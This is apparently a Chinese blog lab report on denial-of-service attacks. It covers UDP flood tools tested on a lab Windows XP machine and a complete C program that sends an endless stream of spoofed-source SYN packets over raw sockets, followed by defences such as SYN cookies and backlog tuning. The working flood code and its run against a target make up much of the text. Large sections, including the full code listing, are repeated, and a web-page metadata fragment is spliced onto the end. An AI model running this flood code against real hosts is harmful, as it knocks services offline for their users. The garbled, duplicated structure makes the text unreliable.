分析一下udp数据包 可以很明显的看到udp数据包的源IP、MAC和目的IP、MAC都是正确的，唯一异常的是udp传送的数据包Data的数据过长，为3000byte, 同时udp因为超过1500会分片传输，大大提高了攻击的效率。 将端口改为445 分析一下udp的结构 发现也完全符合预期，和udp_flood相比，只是包的大小变大了，DDOS的威力也更强大了。 这里查看一下工具前 ping www.baidu.com的时延 攻击靶机的80端口 很明显看到攻击后的udp攻击使得服务器的最高时延增加。 因此，udp_flood一定程度上会阻碍服务器的访问速度。 由此可以知道，udp_flood工具和阿拉丁的原理相同，都是利用UDP洪水攻击，大批量的消耗资源来进行DDOS攻击。 攻击效果的话，如果带宽、流量足够大的话，服务器的会不断的接受包、然后瘫痪、无法正常上网。 0x05 SYN-Flood 编程实现 这里用套接字socket的方法来实现syn-flood攻击\n只需要构造好一个TCP包，指定好包中IP.flags=0x02(为SYN包)。\n我们这里在ubuntu 16 的环境中编译我们写好的程序\n首先查看一下靶机(IP : 192.168.195.135)的开放端口\n发现开启了21、22、80端口 在程序中，对192.168.195.135的80端口进行攻击\n因为程序是无限循环发送，需要手动终止 与此同时，利用Wireshark在靶机进行抓包\n可以看到程序随机产生大量的虚假地址和虚假的端口对靶机的80端口进行访问，因为地址和端口都为虚假的，所以大量的tcp连接靶机无法对其ack回复。 产生大量的syn半连接，导致服务器载荷过大，从而崩溃。\n查看此时的syn状态。 可以很清晰的看到，程序产生了大量的syn半连接，来自不同的虚假ip地址和端口 查看攻击前 ping www.baidu.com 的效果\n攻击其21端口 发现ping www.baidu.com 已经不能Ping通 同时很明显的感受到Windows xp因为受到SYN攻击，因此运行不流畅，卡顿相当严重。\n实际上，SYN-flood攻击就是 构造大量的SYN包、里面填充虚假的IP、MAC地址，来造成服务器产生大量的半连接，从而造成服务器运行瘫痪。\n完整代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; // ip 报头 struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; // tcp 报头 struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; //TCP的伪报头，在计算TCP的校验和时需要包含 struct pseudohdr { unsigned int saddr; //源目的IP unsigned int daddr; // 目的IP char zeros; // 8位保留字符 一般置0 char protocol;// 协议 unsigned short length; // 长度 }; // 这个是计算校验和的函数 unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } // 通过传入的源 IP 地址和目标 IP 地址初始化 IP 头部结构。 void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // 源IP地址 ip-\u0026gt;dstaddr = dstaddr; // 目标IP地址 } // 初始化 tcp 包 void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u0026gt;dport = htons(dport); // 目标端口 tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; // 0x02 代表 是syn 包，tcp三次连接请求的开始 tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } // 初始化 tcp 伪报头 void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } // 通过 目标IP地址 和 目标端口 生成一个 SYN包，保存到参数 packet 中，并且返回包的大小。 int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } // 创造原始套接字 int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } /* 在调用 socket() 函数创建套接字时，指定第二个参数为 SOCK_RAW，表示创建的套接字为原始套接字。然后调用 setsockopt() 函\t数设置 IP 头部由我们自己构建 */ return fd; } // 传入原始套接字、目标IP地址和目标端口，然后通过调用 sendto() 函数向服务端发送一个 SYN包 int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d已攻击!\\n\u0026#34;,addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } // 主函数 int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } // argv[1] 目的地址 // argc[2] 目的端口 addr = inet_addr(argv[1]); port = atoi(argv[2]); // 判断端口是否 存在 if (port \u0026lt; 0 || port \u0026gt; 65535) { fprintf(stderr, \u0026#34;Invalid destination port number: %s\\n\u0026#34;, argv[2]); exit(1); } // 开启socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } // for 无限循环，发送syn包 for (;;) { if (send_syn_packet(sockfd, addr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } } close(sockfd); return 0; } 0x06 实验结论 udp_flood攻击就是构造大量的udp包(可以携带少量数据，也可以携带大量数据，携带数据量越大对服务器的载荷承受就越严重)，占用服务器大量的处理内存，从而引起服务器崩溃。\nSYN-Flood三种攻击方式\nDirect Attack 攻击方使用固定的源地址发起攻击，这种方法对攻击方的消耗最小。 Spoofing(欺骗) Attack 攻击方使用变化的源地址发起攻击，这种方法需要攻击方不停地修改源地址，实际上消耗也不大。 Distributed Direct Attack 这种攻击主要是使用僵尸网络进行固定源地址的攻击 防御手段\nUdp_Flood\n大多数操作系统部分限制了ICMP报文的响应速率，以中断需要ICMP响应的DDoS攻击。这种缓解的一个缺点是在攻击过程中，合法的数据包也可能被过滤。如果UDP Flood的容量足够高以使目标服务器的防火墙的状态表饱和，则在服务器级别发生的任何缓解都将不足以应对目标设备上游的瓶颈。 判断包大小，如果是大包攻击则使用防止UDP碎片方法：根据攻击包大小设定包碎片重组大小，通常不小于1500。在极端情况下，可以考虑丢弃所有UDP碎片。 SYN-Flood\n缩短超时（SYN Timeout）时间\n由于SYN Flood攻击的效果取决于服务器上保持的SYN半连接数，这个值=SYN攻击的频度 x SYN Timeout，所以通过缩短从接收到SYN报文到确定这个报文无效并丢弃改连接的时间，例如设置为20秒以下，可以成倍的降低服务器的负荷。但过低的SYN Timeout设置可能会影响客户的正常访问。\n注意：缩短SYN Timeout时间仅在对方攻击频度不高的情况下生效\n增加最大半连接数\nMore Actions在Linux中执行命令”sysctl -agrep net.ipv4.tcp_max_syn_backlog”可以查看最大半连接数，一般来说大小为128，这个默认值对于Web服务器来说是远远不够的，一次简单的SYN攻击就足以将其完全占用。 因此，防御DOS攻击最简单的办法就是增大这个默认值，在Linux中执行命令”sysctl -w et.ipv4.tcp_max_syn_backlog=3000”，这样就可以将队列SYN最大半连接数容量值改为3000了 过滤网关防护\n一种方式是防止墙确认连接的有效性后，防火墙才会向内部服务器发起SYN请求。防火墙代服务器发出的SYN ACK包使用的序列号为c, 而真正的服务器回应的序列号为c’, 这样，在每个数据报文经过防火墙的时候进行序列号的修改。\n另一种方式是防火墙确定了连接的安全后，会发出一个safe reset命令，client会进行重新连接，这时出现的syn报文会直接放行。这样不需要修改序列号了。但是，client需要发起两次握手过程，因此建立连接的时间将会延长。\nSYN cookies技术\n给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，并记录地址信息，以后从这个IP地址来的包会被一概丢弃。这样做的结果也可能会影响到正常用户的访问。 拒绝服务攻击 0x01 实验目的 使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。 编程实现SYN Flood攻击。 0x02 实验前提知识 DoS（Denial of Service）攻击 凡是能导致合法用户不能正常访问网络服务的行为都可视为拒绝服务攻击。 DDoS（Distributed Denial of Service）攻击 借助数百、数千被植入攻击守护进程的主机，对目标展开的“集团式”拒绝服务攻击，通常针对高带宽、高性能网站 DDoS攻击类型 基于操作系统/应用软件漏洞的DDoS攻击；\n基于协议漏洞的网络层DDoS攻击；\n利用协议漏洞，导致目标资源被大幅占用。是最常见的攻击方式，但需要一定规模的傀儡主机。 面向网络资源的DDoS攻击；\n攻击者控制傀儡机同时发送正常报文，导致目标资源被耗尽。这种攻击方式最难防范，攻击者也需要控制较大规模的主机或服务器 Ping of Death 攻击点：操作系统协议栈没有处理例外情况的设计缺陷。 原理：利用了协议实现时的漏洞（CVE-1999-0128）。ICMP协议用于诊断网络状况（端点是否可达等）。正常情况下，A向B发送ICMP echo request，B收到后返回ICMP echo reply。则A知道，B在线、可达。ICMP包除了包头外，还可以携带数据。这些数据不用于进一步处理，仅辅助诊断网络状况（根据收到响应的时间判断网络是否通畅）。攻击者制造超长数据包，使得数据包超过65535字节上限。没有异常处理的协议栈，收到这样的数据包，可能会由于缓存区溢出而崩溃。（IP数据包的最大长度为65535B，IP首部长度为20B，ICMP首部为8字节，ICMP包最大数据长度为：65535-20-8=65507B. Smurf 以目标IP为源地址，以广播地址为目地址，发送ICMP Echo请求。广播地址对应网络上的每台主机都能收到请求，并向目标发送ICMP Reply，导致目标被大量应答占据资源。 UdpSmurf 利用7号(echo)端口。根据协议，若端口开放，则回送应答UDP数据包。若端口关闭，则发送一个ICMP报文（目标不可达）。 攻击者以广播地址为目标地址，以受害者地址为源地址，使得大量应答包送往受害者。 TCP SYN Flood攻击 通过虚假的数据包，造成目标保存大量半开TCP连接。 管理TCP连接需要系统资源，系统能忍受的半开连接有上限。 当半开连接达到一定数目时，系统将不再接收新的连接请求。 正常的服务请求因此得不到响应。 TCP正常连接过程 A发送SYN包后死机或掉线 TCP协议头\nTCP伪首部\n伪首部共有 12 字节，包含 IP 协议头部的一些字段，有如下信息：32位源IP地址、32位目的IP地址、8位保留字节(置0)、8位传输层协议号(TCP是6，UDP是17)、16位TCP报文长度(TCP首部+数据)。 TCP 协议校验和计算三部分：TCP伪首部 + TCP头部 + TCP数据。 IP 头部\nTCP 协议通过一种名为 三次握手 的过程来建立客户端与服务端的连接，三次握手 过程的原理如图\n建立连接三次握手过程如下：\n客户端需要发送一个 SYN包 给服务端（包含了客户端初始化序列号），并且将连接的状态设置为 SYN_SENT，这个过程由 connect() 系统调用完成。\n服务端接收到客户端发送过来的 SYN包 后，回复一个 SYN+ACK包 给客户端（包含了服务端初始化序列号），并且设置连接的状态为 SYN_RCVD。\n客户端接收到服务端发送过来的 SYN+ACK包 后，设置连接状态为 ESTABLISHED（表示连接已经建立），并且回复一个 ACK包 给服务端。\n服务端接收到客户端发送过来的 ACK包 后，将连接状态设置为 ESTABLISHED（表示连接已经建立）。\n当 三次握手 过程完成后，一个 TCP 连接就此建立完成。\nSYN-flood攻击大概有以下三种攻击方式：\nDirect Attack 攻击方使用固定的源地址发起攻击，这种方法对攻击方的消耗最小。 Spoofing(欺骗) Attack 攻击方使用变化的源地址发起攻击，这种方法需要攻击方不停地修改源地址，实际上消耗也不大。 Distributed Direct Attack 这种攻击主要是使用僵尸网络进行固定源地址的攻击 0x03 实验环境 部署于同一局域网下 攻击机 网络安全实验 Windows xp IP:192.168.195.131 MAC :00-0C-29-06-65-C9 靶机 汇编 Windows xp IP:192.168.195.135 MAC : 00-0c-29-19-ba-6e 程序运行机器 Ubuntu 16 网关 IP : 192.168.195.2 MAC : 00-50-56-e7-d4-22 工具： udp-Flood 阿拉丁 visual studio code wireshark 0x04 工具分析 udp_Flood 首先看一下靶机IP:192.168.195.135开放的端口\n发现TCP中21、22、80端口均开启，UDP开启445,500端口 首先在攻击机打开udp_flood工具，对80端口进行攻击。\n每秒发11个包 然后在靶机中打开Wireshark进行抓包\n容易发现，攻击机向靶机每发一个UDP包，靶机就会回应一个ICMP包\n不难发现，udp包的数据流都没有问题，所有udp包的大小相同，协议相同，短时间发送大量的包\n但是服务器回显ICMP显示Port Unreachable\n这是因为服务器响应发送到其中一个端口的UDP数据包所采取的步骤。在正常情况下，当服务器在特定端口接收到UDP数据包时，会经过两个步骤：\n服务器首先检查是否正在运行正在侦听指定端口的请求的程序。 如果没有程序在该端口接收数据包，则服务器使用ICMP（ping）数据包进行响应，以通知发送方目的地不可达。 80端口并没有UDP进行监听，因此服务器会返回一个ICMP包，告诉发送方不可到达。\n这里利用UDP开始监听的445端口进行实验\nudp发送的包同样没有问题，大小相同，均为83。 这里查看一下udp_flood攻击之前的时间\n然后打开udp_flood，攻击80端口 可以看到阿拉丁udp_flood攻击之后，访问百度会丢包，然后平均时间也增加了 因此，udp_flood一定程度上会阻碍服务器的访问速度。 因此，在udp_flood攻击中，攻击者可发送大量伪造源IP地址的小udp包。由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。这种攻击方式消耗的是攻击者与靶机方两方资源的比拼。\n阿拉丁 首先查看一下靶机开放的端口 在攻击机中打开阿拉丁udp洪水攻击器 首先工具靶机的80端口 便于测试，这里进行一般udp攻击 在靶机中跟据Wireshark进行抓包 分析一下udp数据包 可以很明显的看到udp数据包的源IP、MAC和目的IP、MAC都是正确的，唯一异常的是udp传送的数据包Data的数据过长，为3000byte, 同时udp因为超过1500会分片传输，大大提高了攻击的效率。 将端口改为445 分析一下udp的结构 发现也完全符合预期，和udp_flood相比，只是包的大小变大了，DDOS的威力也更强大了。 这里查看一下工具前 ping www.baidu.com的时延 攻击靶机的80端口 很明显看到攻击后的udp攻击使得服务器的最高时延增加。 因此，udp_flood一定程度上会阻碍服务器的访问速度。 由此可以知道，udp_flood工具和阿拉丁的原理相同，都是利用UDP洪水攻击，大批量的消耗资源来进行DDOS攻击。 攻击效果的话，如果带宽、流量足够大的话，服务器的会不断的接受包、然后瘫痪、无法正常上网。 0x05 SYN-Flood 编程实现 这里用套接字socket的方法来实现syn-flood攻击\n只需要构造好一个TCP包，指定好包中IP.flags=0x02(为SYN包)。\n我们这里在ubuntu 16 的环境中编译我们写好的程序\n首先查看一下靶机(IP : 192.168.195.135)的开放端口\n发现开启了21、22、80端口 在程序中，对192.168.195.135的80端口进行攻击\n因为程序是无限循环发送，需要手动终止 与此同时，利用Wireshark在靶机进行抓包\n可以看到程序随机产生大量的虚假地址和虚假的端口对靶机的80端口进行访问，因为地址和端口都为虚假的，所以大量的tcp连接靶机无法对其ack回复。 产生大量的syn半连接，导致服务器载荷过大，从而崩溃。\n查看此时的syn状态。 可以很清晰的看到，程序产生了大量的syn半连接，来自不同的虚假ip地址和端口 查看攻击前 ping www.baidu.com 的效果\n攻击其21端口 发现ping www.baidu.com 已经不能Ping通 同时很明显的感受到Windows xp因为受到SYN攻击，因此运行不流畅，卡顿相当严重。\n实际上，SYN-flood攻击就是 构造大量的SYN包、里面填充虚假的IP、MAC地址，来造成服务器产生大量的半连接，从而造成服务器运行瘫痪。\n完整代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/time.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;netdb.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; // ip 报头 struct iphdr { unsigned char ver_and_hdrlen;// 版本号与IP头部长度 unsigned char tos; // 服务类型 unsigned short total_len; // 总长度 unsigned short id; // IP包ID unsigned short flags; // 标志位(包括分片偏移量) unsigned char ttl; // 生命周期 unsigned char protocol; // 上层协议 unsigned short checksum; // 校验和 unsigned int srcaddr; // 源IP地址 unsigned int dstaddr; // 目标IP地址 }; // tcp 报头 struct tcphdr { unsigned short sport; // 源端口 unsigned short dport; // 目标端口 unsigned int seq; // 序列号 unsigned int ack_seq; // 确认号 unsigned char len; // 首部长度 unsigned char flag; // 标志位 unsigned short win; // 窗口大小 unsigned short checksum; // 校验和 unsigned short urg; // 紧急指针 }; //TCP的伪报头，在计算TCP的校验和时需要包含 struct pseudohdr { unsigned int saddr; //源目的IP unsigned int daddr; // 目的IP char zeros; // 8位保留字符 一般置0 char protocol;// 协议 unsigned short length; // 长度 }; // 这个是计算校验和的函数 unsigned short inline checksum(unsigned short *buffer, unsigned short size) { unsigned long cksum = 0; while (size \u0026gt; 1) { cksum += *buffer++; size -= sizeof(unsigned short); } if (size) { cksum += *(unsigned char *)buffer; } cksum = (cksum \u0026gt;\u0026gt; 16) + (cksum \u0026amp; 0xffff); cksum += (cksum \u0026gt;\u0026gt; 16); return (unsigned short )(~cksum); } // 通过传入的源 IP 地址和目标 IP 地址初始化 IP 头部结构。 void init_ip_header(struct iphdr *ip, unsigned int srcaddr, unsigned int dstaddr) { int len = sizeof(struct iphdr) + sizeof(struct tcphdr); ip-\u0026gt;ver_and_hdrlen = (4\u0026lt;\u0026lt;4 | sizeof(struct iphdr)/sizeof(unsigned int)); ip-\u0026gt;tos = 0; ip-\u0026gt;total_len = htons(len); ip-\u0026gt;id = 1; ip-\u0026gt;flags = 0x40; ip-\u0026gt;ttl = 255; ip-\u0026gt;protocol = IPPROTO_TCP; ip-\u0026gt;checksum = 0; ip-\u0026gt;srcaddr = srcaddr; // 源IP地址 ip-\u0026gt;dstaddr = dstaddr; // 目标IP地址 } // 初始化 tcp 包 void init_tcp_header(struct tcphdr *tcp, unsigned short dport) { tcp-\u0026gt;sport = htons(rand() % 16383 + 49152); // 随机生成一个端口 tcp-\u0026gt;dport = htons(dport); // 目标端口 tcp-\u0026gt;seq = htonl(rand() % 90000000 + 2345 ); // 随机生成一个初始化序列号 tcp-\u0026gt;ack_seq = 0; tcp-\u0026gt;len = (sizeof(struct tcphdr) / 4 \u0026lt;\u0026lt; 4 | 0); tcp-\u0026gt;flag = 0x02; // 0x02 代表 是syn 包，tcp三次连接请求的开始 tcp-\u0026gt;win = htons(1024); tcp-\u0026gt;checksum = 0; tcp-\u0026gt;urg = 0; } // 初始化 tcp 伪报头 void init_pseudo_header(struct pseudohdr *pseudo, unsigned int srcaddr, unsigned int dstaddr) { pseudo-\u0026gt;zeros = 0; pseudo-\u0026gt;protocol = IPPROTO_TCP; pseudo-\u0026gt;length = htons(sizeof(struct tcphdr)); pseudo-\u0026gt;saddr = srcaddr; pseudo-\u0026gt;daddr = dstaddr; } // 通过 目标IP地址 和 目标端口 生成一个 SYN包，保存到参数 packet 中，并且返回包的大小。 int make_syn_packet(char *packet, int pkt_len, unsigned int daddr, unsigned short dport) { char buf[100]; int len; struct iphdr ip; //IP 头部 struct tcphdr tcp; //TCP 头部 struct pseudohdr pseudo; //TCP 伪头部 unsigned int saddr = rand(); len = sizeof(ip) + sizeof(tcp); // 初始化头部信息 init_ip_header(\u0026amp;ip, saddr, daddr); init_tcp_header(\u0026amp;tcp, dport); init_pseudo_header(\u0026amp;pseudo, saddr, daddr); //计算IP校验和 ip.checksum = checksum((u_short *)\u0026amp;ip, sizeof(ip)); // 计算TCP校验和 bzero(buf, sizeof(buf)); memcpy(buf , \u0026amp;pseudo, sizeof(pseudo)); // 复制TCP伪头部 memcpy(buf + sizeof(pseudo), \u0026amp;tcp, sizeof(tcp)); // 复制TCP头部 tcp.checksum = checksum((u_short *)buf, sizeof(pseudo) + sizeof(tcp)); bzero(packet, pkt_len); memcpy(packet, \u0026amp;ip, sizeof(ip)); memcpy(packet + sizeof(ip), \u0026amp;tcp, sizeof(tcp)); return len; } // 创造原始套接字 int make_raw_socket() { int fd; int on = 1; // 创建一个原始套接字, 指定其关注TCP协议 fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP); if (fd == -1) { return -1; } // 设置需要手动构建IP头部 if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (char *)\u0026amp;on, sizeof(on)) \u0026lt; 0) { close(fd); return -1; } /* 在调用 socket() 函数创建套接字时，指定第二个参数为 SOCK_RAW，表示创建的套接字为原始套接字。然后调用 setsockopt() 函\t数设置 IP 头部由我们自己构建 */ return fd; } // 传入原始套接字、目标IP地址和目标端口，然后通过调用 sendto() 函数向服务端发送一个 SYN包 int send_syn_packet(int sockfd, unsigned int addr, unsigned short port) { struct sockaddr_in skaddr; char packet[256]; int pkt_len; bzero(\u0026amp;skaddr, sizeof(skaddr)); skaddr.sin_family = AF_INET; skaddr.sin_port = htons(port); skaddr.sin_addr.s_addr = addr; printf(\u0026#34;%d已攻击!\\n\u0026#34;,addr); pkt_len = make_syn_packet(packet, 256, addr, port); return sendto(sockfd, packet, pkt_len, 0, (struct sockaddr *)\u0026amp;skaddr, sizeof(struct sockaddr)); } // 主函数 int main(int argc, char *argv[]) { unsigned int addr; unsigned short port; int sockfd; if (argc \u0026lt; 3) { fprintf(stderr, \u0026#34;Usage: synflood \u0026lt;address\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;); exit(1); } // argv[1] 目的地址 // argc[2] 目的端口 addr = inet_addr(argv[1]); port = atoi(argv[2]); // 判断端口是否 存在 if (port \u0026lt; 0 || port \u0026gt; 65535) { fprintf(stderr, \u0026#34;Invalid destination port number: %s\\n\u0026#34;, argv[2]); exit(1); } // 开启socket sockfd = make_raw_socket(); if (sockfd == -1) { fprintf(stderr, \u0026#34;Failed to make raw socket\\n\u0026#34;); exit(1); } // for 无限循环，发送syn包 for (;;) { if (send_syn_packet(sockfd, addr, port) \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to send syn packet\\n\u0026#34;); } } close(sockfd); return 0; } 0x06 实验结论 udp_flood攻击就是构造大量的udp包(可以携带少量数据，也可以携带大量数据，携带数据量越大对服务器的载荷承受就越严重)，占用服务器大量的处理内存，从而引起服务器崩溃。\nSYN-Flood三种攻击方式\nDirect Attack 攻击方使用固定的源地址发起攻击，这种方法对攻击方的消耗最小。 Spoofing(欺骗) Attack 攻击方使用变化的源地址发起攻击，这种方法需要攻击方不停地修改源地址，实际上消耗也不大。 Distributed Direct Attack 这种攻击主要是使用僵尸网络进行固定源地址的攻击 防御手段\nUdp_Flood\n大多数操作系统部分限制了ICMP报文的响应速率，以中断需要ICMP响应的DDoS攻击。这种缓解的一个缺点是在攻击过程中，合法的数据包也可能被过滤。如果UDP Flood的容量足够高以使目标服务器的防火墙的状态表饱和，则在服务器级别发生的任何缓解都将不足以应对目标设备上游的瓶颈。 判断包大小，如果是大包攻击则使用防止UDP碎片方法：根据攻击包大小设定包碎片重组大小，通常不小于1500。在极端情况下，可以考虑丢弃所有UDP碎片。 SYN-Flood\n缩短超时（SYN Timeout）时间\n由于SYN Flood攻击的效果取决于服务器上保持的SYN半连接数，这个值=SYN攻击的频度 x SYN Timeout，所以通过缩短从接收到SYN报文到确定这个报文无效并丢弃改连接的时间，例如设置为20秒以下，可以成倍的降低服务器的负荷。但过低的SYN Timeout设置可能会影响客户的正常访问。\n注意：缩短SYN Timeout时间仅在对方攻击频度不高的情况下生效\n增加最大半连接数\nMore Actions在Linux中执行命令”sysctl -agrep net.ipv4.tcp_max_syn_backlog”可以查看最大半连接数，一般来说大小为128，这个默认值对于Web服务器来说是远远不够的，一次简单的SYN攻击就足以将其完全占用。 因此，防御DOS攻击最简单的办法就是增大这个默认值，在Linux中执行命令”sysctl -w et.ipv4.tcp_max_syn_backlog=3000”，这样就可以将队列SYN最大半连接数容量值改为3000了 过滤网关防护\n一种方式是防止墙确认连接的有效性后，防火墙才会向内部服务器发起SYN请求。防火墙代服务器发出的SYN ACK包使用的序列号为c, 而真正的服务器回应的序列号为c’, 这样，在每个数据报文经过防火墙的时候进行序列号的修改。\n另一种方式是防火墙确定了连接的安全后，会发出一个safe reset命令，client会进行重新连接，这时出现的syn报文会直接放行。这样不需要修改序列号了。但是，client需要发起两次握手过程，因此建立连接的时间将会延长。\nSYN cookies技术\n给每一个请求连接的IP地址分配一个Cookie，如果短时间内连续受到某个IP的重复SYN报文，就认定是受到了攻击，并记录地址信息，以后从这个IP地址来的包会被一概丢弃。这样做的结果也可能会影响到正常用户的访问。 ","permalink":"http://www.reus09.top/posts/tech/ddos/","summary":"拒绝服务攻击 0x01 实验目的 使用udp flood、阿拉丁等工具，分组展开攻击并利用wireshark分析。 编程实现SYN Flood攻击。 0x02 